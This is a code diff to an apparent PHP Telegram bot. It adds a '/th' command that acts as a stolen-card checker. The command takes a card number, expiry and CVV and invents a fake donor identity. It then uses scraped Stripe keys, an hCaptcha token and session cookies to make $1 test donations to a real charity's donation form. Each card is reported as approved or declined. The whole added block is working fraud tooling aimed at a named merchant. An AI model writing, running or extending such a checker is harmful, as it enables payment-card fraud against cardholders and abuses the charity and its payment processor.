@@ -8,9 +8,253 @@ function chkgo($chatId, $message, $message_id) {
 
 
 unlink('cookie.txt');
-	
-	
 
+	
+if (preg_match('/^(!|\/|\.)th/', $message)) {
+	
+$lista = substr($message, 4);
+$i = preg_split('/[|:| ]/', $lista);
+$cc    = $i[0];
+$mes   = $i[1];
+$ano  = trim(substr($i[2], -2));
+$cvv   = $i[3];
+/*
+$bin = substr($lista, 0, 6);
+if (strlen($ano) == 2) {
+    $ano = '20' . $ano;
+}
+
+if (strlen($mes) == 1 && $mes <= 9) {
+    $mes = '0' . $mes;
+}
+*/
+
+$lista = "$cc|$mes|$ano|$cvv";
+
+$bin = substr($lista, 0, 6);
+//-----------------------------------------------------//
+
+
+$longitud_cc = (substr($cc, 0, 2) == "37" || substr($cc, 0, 2) == "34") ? 15 : 16;
+if (!is_numeric($cc) || strlen($cc) != $longitud_cc || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
+    $respuesta = "🚫 Oops!\nUse this format: /th CC|MM|YYYY|CVV\n";
+    sendMessage($chatId, $respuesta, $message_id);
+    die();
+}
+
+//----------------MENSAGE DE ESPERA-------------------//
+$respuesta = "<b>🕒 Wait for Result...</b>";
+sendMessage($chatId,$respuesta, $message_id);
+//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
+$id_text = file_get_contents("ID");
+//----------------------------------------------------//
+
+$startTime = microtime(true); //TIEMPO DE INICIO
+$BinData = BinData($bin); //Extrae los datos del bin
+
+
+////RANDOM USER//
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$get = curl_exec($ch);
+curl_close($ch);
+        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
+        $name = $matches1[1][0];
+        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
+        $last = $matches1[1][0];
+        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
+        $email = $matches1[1][0];
+        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
+	$street = $matches1[1][0];
+        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
+        $city = $matches1[1][0];
+        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
+        $state = $matches1[1][0];
+        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
+        $phone = $matches1[1][0];
+        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
+        $postcode = $matches1[1][0];
+
+$curl = curl_init();
+
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => 'type=card&billing_details%5Bname%5D='.$name.'+'.$last.'&billing_details%5Bemail%5D='.$email.'&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_month%5D='.$mes.'&card%5Bexp_year%5D='.$ano.'&guid=39a0a515-7cc3-4865-9377-3d862c3ec4b88341ec&muid=fdc8fd8d-c28e-4ed7-a4fb-6f4b07e0e1ba61aee8&sid=758deca0-c28a-4aec-9636-20e776dc0656d25599&payment_user_agent=stripe.js%2F18400c65be%3B+stripe-js-v3%2F18400c65be%3B+split-card-element&referrer=https%3A%2F%2Fwww.theofilosfoundation.org.au&time_on_page=83194&key=pk_live_QPCKAlh0ArPwTCiMm1rgxLBB00aGlZFdkU&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5Ijoia1NFVU5lT2FNRVArdExvQURPdXBtdjY5QmZNYTMvWEhwMnJsUmdLN3lUSFNvek4zb2JXbmZuUVA3a3U2djhlOHFwdlAyN00rclZzckhCYjVnbmtadHgzb3NsS3hCdmhKTEZJUFIyTUw5S3R2Tm1JTmg5eG1aclJ0c256eUhJRnZJYThnT0huMnAxYVBzcWE1N0ZZT3pjZ2tOU0VwNk8yNXg5UFh3WHRrQ3N0L2FmMXlXcjEyekFkRm5oZURvUXErMVhHTjdtdHBNTXc3RmJRQllWTHhuREVRSmJRMzdZd014ZE1MMER3UFJmWmttNVVKcU9yVVQyd3VNS3F1NUZPRmhKR2ROYU9WMk00OFdFWHZlc3QrRGRMcFEyTWdKakpCM1RKOVNRNG5mRXQ2aGIrdk9md1JmK05URmNid2NJUTk5QzE5YStUWlMzTHY4b1VnM1dqQkZLY1VTNGpvOUJsK0lOREIydkFGdXQyL3l2eGFPdHRxUm9UOVhtdTVHS0g5R0U1TDdsbndkaTY3bFhWTndZREhEa1VpdnJBaENtRjFsTzRoditkZmpBNDBhVm9KOUlld0Q4bG5HUXRXWlp1QVhZdVlkMk93bTdYUFluenJpVjlvWEtDZmhwNmppNjJxZzRJVUl1eU9SN3htOXpPa2cyRmRySWg5UVRSQ3Q1bzNhcjhIWldXcTNoZWNFalBVdUc1S0Y2TEVBdC91VjFzNWdnNEpoelE2V1hDdzJ4VXR1NmZVUXBRL3U5QkZPYVNndmU4MDQ5c2JpSTNNcGZrVmNBd01XUlFrN0ZpNThsV05RTWhJUFdGUWhyZmlXRzRyalZuSU9GaXpBZzd2Nnpra2w0WUNieWF5WnY3VHdjV2ZxZlRoSmVVV0VEa2RZNFRpOWFyRmpjaFJ4d1FtM28vMituWjNaSkVWMklOQVY5eDBzSngxM251N1FqU1JIemM3SmZmUk1ialF4UjEvcmlMRmZ2TkJQaVBwRkRXdGk4Q0I2Qk5KaWRSUkxuMStVRklTaVJzUnk4akZibW5jUDNQRyt1ekFYenZDOEdWa1VDUXhhbzlFMmwwa254ZVBSb1dELzlha0NOeUllckZRQUJ1c0JYN1NkLzlwZVpvVGVsbnhOV2xJZjYrWEluekQxY0tWSXJnMWpPK1NwL3FPRnp5S0RpY0gxaGxYNUlTZjNnVGE4NjdIeENQVUIrVHovUXBDa3BxNmh6aVBDOTFEYVp6M3dlTkJCUEZkM253RzRicEpwNmhBWjBGNk0xMFF4OHFmZkRjMmcyWnQxeEQ1Ny85enZDLzd0Wk5KQVA0Kzcrb3MzREFOY0EzM2pnQ0lPN0FjRGQ4dkxXNkRNdVFzdVllUndlSXdWRGx3aDhNQ1FVZk9mUjJ3elNmdjM1UlNWZVlXYnZEbm5jNTZ5Z2VpaVZUMGF0R28rS01ZZGEwOEVuMFFYbEV0OVY3UE5WOVZ0Ni9ML2VCSUlBcUQwaW1INUs2RHEza1R3MVMxbGRGY0JNNWdjVjYxVGlMRUFpWFJkVVphSUpZcEhadWRwdUo1Q0hEclFkTm9FOU1HMnJXZUJpdmxEaUpjVFdDTW9QMlFLMklqbmRoNzdBaldoMU5RS28xTThrQWFkQm9OVDFYRjRXTjZRVHdIcE5LakxLdGl2YitKYjdHdGlPc1FEUitPRGE2bGdRZldhZmVsN3VnR1R4dCtlZ2ZlcWR0cGg1eGMwTTM4ZTFjZ2dqSkI3NkNONTlpV2F3eTl0TkhWUTdkN0tDMkxxbmNxUG8vanh3NHlvajJNYUh5WlhUK2xrZmJVdUJuL1JhZGVndWs4NU1VRGpvUEp4c3padWlHalpnM1lBem0rRXNQV3dhSlJReDBwb0IvQ1Y3bnIwY1M5R284YkRiZG1pUUorM3hGemIrUEI2a2NaOWZIUVB2M1J5K0xtamdNa2ZPaXl4RUZlVFYyQTFUU2pmUi83VlRqUFg4R3Vvd1o3eVBLQUZpOWN2YXZZa0ZraU1OLzhXM2lFZVlFd2NiUjZ5UXY1NUpYcHdIV2IvWUdNREtZYURwejJsMTcxRm1HUDJ0d0xqWlp6cmExZm91RzJmVnRZMG8ydmh2V0FYNWJlQ01yM0N5UlhNeWM3bzlRUHFtYmw0NE1vOEVCR1lydTBjL3NTaVVDb1lLeEh4TUFZcHBnQmJhakJybjJ5bGgvVjVvcGt0QXNnTi9oZXBOWkdkeVdORmdKdUs4ZDdEaVU5ekFiUUIrdFVmOEw0ckQwTitNSmE3ZkVOSzJqU0Z5S3VxZHFjTHdOWVVNQ3NGSkRtRVF0WUhPUWN5aFpjazV2QmRzbU5XVG5OeWg0QnVEN2tzZEZDQVlxMEdlRnVWUk5oQlh6Ykh5Nlc0VUZCaFFhRm9FaFF1VVRYeUF2OGhZM2NSOEV5ZVBWVnpHT1hSekhHbjZ5SC8wSHlRV0pxL1Yza0NaamZyKzRXN2psalVvbWV6TnFBLzRpRVh3VnNsZlIxbDJ0UnIxS2czWmVMYkNpQ0NLTXRLNENOMHY4SGpUY1JiWWhyQTdCRGRBNEFLaWdCOTZlUU5ySHBBektycW9SS0ZiaE1VMTNuREdJOTFaUml2bFhrck1LSEZLOHVwOGhnci95dE1tQ2hLN3VZZU1FTFB1NlFSMzU4V3A4cStwYXdkR1BhYi9qT0RyUlUyaWEyV3Y1RUxGT1JkYktCQzBXbmxSNVVDM0hVejV5ZHhnPT0iLCJleHAiOjE3NDI4Mjc2ODMsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiMWVhZTFkZGUiLCJwZCI6MCwiY2RhdGEiOiJYU2xBTXB2dldlTy9iNWJEM2FlVlRsT1pCVmZhZkRQbTdPdVBwK255QU1iRW51QmlpRTdkN2dCZFVySVVKcVZ0R09NeUY1N0FiVXJBQXQrbS9ZUkw1ZzY5d0hSWmhoZFR2YWM2d1F3cW84OGhzSlZ0VFJjOWkwYWVYTVh5d1FmclFGN29EbG5wbmVqclVqTkp2YitrNm1zS3g3cFFkdU1nZEl6REwvWWd1OUZZNllzOTVrQ2tPOG4rN1k5ZFRkdmdJWThnK3hWU1l5NFV6TGhyIn0._wjMM3WNbP5u9EVlhKY41CT8R6LB-nXAt-5QdydpA-E',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
+    'Accept: application/json',
+    'Content-Type: application/x-www-form-urlencoded',
+    'accept-language: es-US,es;q=0.9',
+    'origin: https://js.stripe.com',
+    'referer: https://js.stripe.com/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$json = json_decode($response, true);
+$id = $json["id"];
+echo "$id\n";
+curl_close($curl);
+
+
+
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://www.theofilosfoundation.org.au/donate/?payment-mode=stripe_checkout&form-id=79069',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => 'give-honeypot=&give-form-id-prefix=79069-1&give-form-id=79069&give-form-title=Donation+Form&give-current-url=https%3A%2F%2Fwww.theofilosfoundation.org.au%2Fdonate%2F&give-form-url=https%3A%2F%2Fwww.theofilosfoundation.org.au%2Fdonate%2F&give-form-minimum=1.00&give-form-maximum=999999.99&give-form-hash=c913e1be37&give-price-id=custom&give-amount=1.00&give_stripe_payment_method='.$id.'&payment-mode=stripe_checkout&give_first='.$name.'&give_last='.$last.'&give_email='.$email.'&card_name='.$name.'+'.$last.'+Lopez+&give_validate_stripe_payment_fields=1&give_action=purchase&give-gateway=stripe_checkout',
+  CURLOPT_COOKIE => 'uncode_privacy[consent_types]=%5B%5D; uncodeAI.screen=360; uncodeAI.images=2064; uncodeAI.css=360x800@16; __stripe_mid=fdc8fd8d-c28e-4ed7-a4fb-6f4b07e0e1ba61aee8; __stripe_sid=758deca0-c28a-4aec-9636-20e776dc0656d25599; wp-give_session_9d6049e39fa0e46fc282c55d085c1902=ff3f4f8799b2ae44f86f3fe034019d17%7C%7C1743432347%7C%7C1743428747%7C%7Cbfab638ea45ddfca460abbc33298e619; wp-give_session_reset_nonce_9d6049e39fa0e46fc282c55d085c1902=1',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
+    'Content-Type: application/x-www-form-urlencoded',
+    'sec-ch-ua-platform: "Android"',
+    'origin: https://www.theofilosfoundation.org.au',
+    'accept-language: es-US,es;q=0.9',
+    'referer: https://www.theofilosfoundation.org.au/donate/?form-id=79069',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+curl_close($curl);
+$patron = '/<p><strong>Error<\/strong>: (.*)<\/p>/';
+preg_match($patron, $response, $coincidencia);
+$respo = $coincidencia[1];
+echo "$respo\n";
+
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://www.theofilosfoundation.org.au/donation-confirmation/',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_COOKIE => 'uncode_privacy[consent_types]=%5B%5D; uncodeAI.screen=360; uncodeAI.images=2064; uncodeAI.css=360x800@16; __stripe_mid=fdc8fd8d-c28e-4ed7-a4fb-6f4b07e0e1ba61aee8; __stripe_sid=758deca0-c28a-4aec-9636-20e776dc0656d25599; wp-give_session_9d6049e39fa0e46fc282c55d085c1902=ff3f4f8799b2ae44f86f3fe034019d17%7C%7C1743432347%7C%7C1743428747%7C%7Cbfab638ea45ddfca460abbc33298e619; wp-give_session_reset_nonce_9d6049e39fa0e46fc282c55d085c1902=1',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
+    'upgrade-insecure-requests: 1',
+    'accept-language: es-US,es;q=0.9',
+    'sec-ch-ua-platform: "Android"',
+    'referer: https://www.theofilosfoundation.org.au/donate/?form-id=79069',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+curl_close($curl);
+
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://www.theofilosfoundation.org.au/wp-admin/admin-ajax.php?action=get_receipt&shortcode_atts=%7B%22error%22%3A%22You+are+missing+the+donation+id+to+view+this+donation+receipt.%22%2C%22price%22%3Atrue%2C%22donor%22%3Atrue%2C%22date%22%3Atrue%2C%22payment_method%22%3Atrue%2C%22payment_id%22%3Atrue%2C%22payment_status%22%3Afalse%2C%22company_name%22%3Afalse%2C%22status_notice%22%3Atrue%7D&donation_id=79340&receipt_type=&wp-give_session_9d6049e39fa0e46fc282c55d085c1902=ff3f4f8799b2ae44f86f3fe034019d17%257C%257C1743432347%257C%257C1743428747%257C%257Cbfab638ea45ddfca460abbc33298e619',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_COOKIE => 'uncode_privacy[consent_types]=%5B%5D; uncodeAI.screen=360; uncodeAI.images=2064; uncodeAI.css=360x800@16; __stripe_mid=fdc8fd8d-c28e-4ed7-a4fb-6f4b07e0e1ba61aee8; __stripe_sid=758deca0-c28a-4aec-9636-20e776dc0656d25599; wp-give_session_9d6049e39fa0e46fc282c55d085c1902=ff3f4f8799b2ae44f86f3fe034019d17%7C%7C1743432347%7C%7C1743428747%7C%7Cbfab638ea45ddfca460abbc33298e619; wp-give_session_reset_nonce_9d6049e39fa0e46fc282c55d085c1902=1',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform: "Android"',
+    'x-requested-with: XMLHttpRequest',
+    'accept-language: es-US,es;q=0.9',
+    'referer: https://www.theofilosfoundation.org.au/donation-confirmation/',
+    'priority: u=1, i',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+file_put_contents('/sdcard/index.html', $response);
+curl_close($curl);
+
+
+$partes = explode("Error<\/strong>:", $response);
+$respo = trim(explode("<\/p>", $partes[1])[0]);
+
+
+if(empty($respo)){
+$partes = explode("Payment Complete: ", $response);
+$respo = trim(explode("\n", $partes[1])[0]);
+}
+
+if ($respo == "Thank you for your donation.") {
+$respo = "Thank You.";
+}
+
+if ($respo == "Error creating payment intent with Stripe. Please try again.") {
+$respo = "Declined";
+}
+
+
+$timetakeen = (microtime(true) - $startTime);
+$time = substr_replace($timetakeen, '', 4);
+$proxy = "LIVE ✅";
+
+$bin = "<code>".$bin."</code>";
+$lista = "<code>".$lista."</code>";
+
+
+if (empty($respo)) {
+        $respo = "Service Unavailable";
+}
+
+
+if ($respo == '{"error":"Bad JSON Response"}') {
+$respo = "Service Unavailable";
+}
+/*if ($respo == "SUCCEEDED"){
+    $respo = "Charged $5";
+}*/
+$logo = "<a href='http://t.me/XNazunaBot'>[↯]</a>";
+
+if (array_in_string($respo, $live_array)) {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 1$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = True;
+} elseif (strpos($respo, 'Declined') !== false || strpos($respo, '107: Fails Fraud Checks') !== false || strpos($respo, '101: INVALID TRANS') !== false || strpos($respo, 'CARD_AUTHENTICATION_FAILED') !== false || strpos($respo, 'INVALID CARD') !== false || strpos($respo, 'UNABLE TO AUTH') !== false || strpos($respo, 'Card type is too long.Card type is invalid.') !== false) {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 1$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = False;
+} elseif (strpos($respo, 'CHALLENGE_REQUIRED') !== false) {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 1$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐑𝐞𝐣𝐞𝐜𝐭𝐞𝐝 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = False;
+} else {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 1$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐆𝐀𝐓𝐄 𝐄𝐑𝐑𝐎𝐑 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = False;
+}
+
+if ($live) {
+    editMessage($chatId, $respuesta, $id_text);
+} else {
+    editMessage($chatId, $respuesta, $id_text);
+}
+
+//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
+ob_flush();
+
+
+ }
+
+
+	
 	
 if (preg_match('/^(!|\/|\.)cb/', $message)) {
 	
